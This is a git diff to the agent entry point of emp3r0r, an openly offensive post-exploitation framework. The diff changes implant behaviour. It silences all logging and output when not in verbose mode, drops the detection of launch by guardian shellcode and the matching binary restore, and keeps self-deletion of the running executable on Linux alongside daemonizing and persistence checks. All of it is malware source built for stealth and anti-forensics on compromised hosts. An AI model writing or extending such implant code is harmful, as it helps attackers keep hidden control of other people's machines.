@@ -22,6 +22,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
@@ -31,11 +32,6 @@ import (
 func agent_main() {
 	var err error
 	replace_agent := false
-
-	// check if this process is invoked by guardian shellcode
-	// by checking if process executable is same as parent's
-	isForked := util.ProcExePath(os.Getpid()) ==
-		util.ProcExePath(os.Getppid())
 
 	// accept env vars
 	verbose := os.Getenv("VERBOSE") == "true"
@@ -50,6 +46,8 @@ func agent_main() {
 		log.SetOutput(f)
 		log.Println("emp3r0r agent has started")
 	} else {
+		logging.SetOutput(io.Discard)
+		log.SetOutput(io.Discard)
 		null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
 		if err != nil {
 			log.Fatalf("%s: %v", os.DevNull, err)
@@ -57,7 +55,6 @@ func agent_main() {
 		defer null_file.Close()
 		os.Stderr = null_file
 		os.Stdout = null_file
-		log.SetOutput(io.Discard)
 	}
 
 	replace_agent = os.Getenv("REPLACE_AGENT") == "true"
@@ -74,8 +71,8 @@ func agent_main() {
 	exe_path := util.ProcExePath(os.Getpid())
 	daemonizeIfNeeded(verbose, is_dll, exe_path)
 
-	// self delete
-	self_delete := !is_dll && !isForked && !persistence && runtime.GOOS == "linux"
+	// self delete under Linux
+	self_delete := !is_dll && !persistence && runtime.GOOS == "linux"
 	if self_delete {
 		err = deleteCurrentExecutable()
 		if err != nil {
@@ -88,18 +85,6 @@ func agent_main() {
 	err = common.ApplyRuntimeConfig()
 	if err != nil {
 		log.Fatalf("ApplyRuntimeConfig: %v", err)
-	}
-
-	if isForked {
-		// restore original executable file
-		err = util.Copy(
-			fmt.Sprintf("%s/%s",
-				common.RuntimeConfig.AgentRoot,
-				util.FileBaseName(util.ProcExePath(os.Getpid()))),
-			util.ProcExePath(os.Getpid()))
-		if err != nil {
-			log.Printf("failed to restore original executable: %v", err)
-		}
 	}
 
 	if !is_dll {
@@ -126,8 +111,8 @@ func agent_main() {
 		// remove *.downloading files
 		cleanUpDownloadingFiles()
 
-		if isForked || is_dll {
-			log.Printf("emp3r0r %d is invoked by shellcode/loader.so in %d",
+		if is_dll {
+			log.Printf("emp3r0r %d is invoked by DLL in %d",
 				os.Getpid(), os.Getppid())
 		}
 	}
